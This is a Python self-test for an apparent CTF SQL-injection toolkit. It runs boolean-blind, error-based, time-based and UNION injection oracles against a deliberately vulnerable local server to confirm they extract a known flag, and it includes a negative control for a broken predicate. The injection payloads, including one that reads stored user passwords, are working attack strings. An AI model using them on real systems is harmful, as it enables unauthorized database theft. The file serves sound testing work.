"""Prove the engines work before pointing them at a target.

    python -m ctfagent.kit.selftest

Starts ``local_target`` (a deliberately injectable server on 127.0.0.1 whose
flag is known), then extracts that flag through each of four oracles. Every
oracle must return the exact known value; a miss is a failure with a non-zero
exit code, not a warning.

Why this exists as a runnable module and not only as a unit test: the doctrine
in this project is that "not found" means nothing until the detector has been
shown to find a known answer (``positive-control-before-negative``). A worker
that gets an empty string out of a blind extractor cannot tell "the target has
no data" from "my oracle is dead". Running this first turns that ambiguity into
a stable fact — the tool is fine, so the target is the problem.

Also checks the *negative* direction: an extraction against a broken predicate
must raise :class:`OracleError`, not return a short string. A tool that fails
quietly is worse than one that fails loudly.
"""

from __future__ import annotations

import sys
import time
import traceback
import urllib.parse

from .http import Session
from .local_target import FLAG, SECRET, start
from .sqli import BoolOracle, ErrorOracle, Extractor, OracleError, TimeOracle, UnionOracle


def _burn(rows: int = 3_000_000) -> str:
    """sqlite's SLEEP(): a recursive CTE the TRUE branch has to count.

    3M rows measured at ~0.35s here. That is enough for the calibration gap
    (TimeOracle only requires `delay`/2) while keeping the self-test under
    half a minute; the mechanism being tested is the threshold, not the burn.
    """
    return (
        "(SELECT count(*) FROM (WITH RECURSIVE c(x) AS "
        f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{rows}) SELECT x FROM c))"
    )


def _checks(base: str) -> list[tuple[str, callable, str]]:
    """(name, thunk, expected substring) — each thunk returns a string."""
    s = Session(base, timeout=30)

    def boolean():
        def probe(cond):
            r = s.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
            if not r.status:
                return None  # transport failure is not FALSE
            return '"exists": true' in r.text

        o = BoolOracle(probe).calibrate()
        return Extractor(o, max_length=64).read("SELECT flag FROM secrets LIMIT 1")

    def error_based():
        def probe(cond):
            r = s.get(
                "/err",
                {"id": f"1' AND abs(CASE WHEN ({cond}) THEN -9223372036854775808 ELSE 1 END)--"},
            )
            return r.text if r.status else None

        o = ErrorOracle(probe, pattern="integer overflow").calibrate()
        return Extractor(o, max_length=64).read("SELECT flag FROM secrets LIMIT 1")

    def time_based():
        def probe(cond):
            r = s.get("/timing", {"id": f"1' AND CASE WHEN ({cond}) THEN {_burn()} ELSE 0 END AND '1'='1"})
            return r.elapsed if r.status else None

        # Deliberately short: this check proves the *mechanism* (a delay only
        # the TRUE branch produces, and a threshold measured from the FALSE
        # branch) rather than re-extracting the whole flag, which would cost
        # ~170 requests at 0.35s each. Four characters is enough to be wrong
        # if the bisection or the threshold is wrong.
        o = TimeOracle(probe, delay=0.35, samples=1, retries=1).calibrate()
        return Extractor(o, max_length=4).read("SELECT SUBSTR(flag,1,4) FROM secrets LIMIT 1")

    def union(expr: str = "(SELECT flag FROM secrets LIMIT 1)"):
        # Rows come back merged by UNION and sqlite decides the order, so
        # "the last <li>" is not the injected one — measured: for `pass` the
        # injected row sorted *first*. The value is therefore bracketed with a
        # marker and found by the marker, which is what a real spec should do.
        left, right = "SQ", "LI"

        def probe(injected):
            r = s.get("/search", {"q": f"1' UNION SELECT 1,'{left}'||{injected}||'{right}'--"})
            if not r.status:
                return None
            marker = f"{left}"
            for item in r.text.split("<li>")[1:]:
                value = item.split("</li>")[0]
                if value.startswith(marker) and value.endswith(right):
                    return value[len(marker) : -len(right)]
            return ""

        o = UnionOracle(probe).calibrate()
        got = o.extract(expr)
        return got or ""

    return [
        ("布尔盲注", boolean, FLAG),
        ("错误回显", error_based, FLAG),
        ("时间盲注", time_based, FLAG[:4]),
        ("UNION", lambda: union(), FLAG),
        # A different column: proves the engine reads what the spec asks for,
        # not the one value it was tuned on. The target's own query joins
        # `pass` with the username, so this row is `admin|admin-pw-9f2a` — the
        # assertion is on what the injected expression evaluated to.
        ("UNION 另一列", lambda: union("(SELECT name||'|'||pass FROM users WHERE id=1)"),
         "admin|" + SECRET),
    ]


def _negative(base: str) -> tuple[bool, str]:
    """A spec whose predicate never reaches the query must raise, not return ''."""
    s = Session(base, timeout=10)

    def broken(cond):
        # The payload is pointless: `id=1` ignores it entirely and always
        # answers TRUE. This is the classic silent-negative bug.
        r = s.get("/check", {"id": "1"})
        return 'exists":true' in r.text

    o = BoolOracle(broken)
    try:
        o.calibrate()
    except OracleError as exc:
        return True, f"拒绝校准（正确）：{str(exc).splitlines()[0][:90]}"
    return False, "坏 spec 竟然校准通过 —— 校准逻辑有洞"


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    target = start()
    print(f"本地靶子 {target.base}  已知 flag = {FLAG}\n")
    failures = 0
    try:
        for name, thunk, expected in _checks(target.base):
            started = time.time()
            try:
                got = thunk()
            except Exception as exc:  # noqa: BLE001 - report, do not crash the run
                failures += 1
                print(f"  × {name:<18} 抛异常: {type(exc).__name__}: {exc}")
                if "-v" in argv:
                    traceback.print_exc()
                continue
            took = time.time() - started
            if got == expected:
                print(f"  √ {name:<18} {took:5.1f}s  {got!r}")
            else:
                failures += 1
                print(f"  × {name:<18} {took:5.1f}s  期望 {expected!r}，得到 {got!r}")

        ok, note = _negative(target.base)
        print(f"  {'√' if ok else '×'} {'阴性对照':<16} {note}")
        if not ok:
            failures += 1
    finally:
        target._server.shutdown()
        target._server.server_close()

    print()
    if failures:
        print(f"{failures} 项失败 —— 工具不可信，先修工具再去打目标。")
        return 1
    print("全部通过：引擎能解出已知答案，且坏 spec 会被拒绝。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
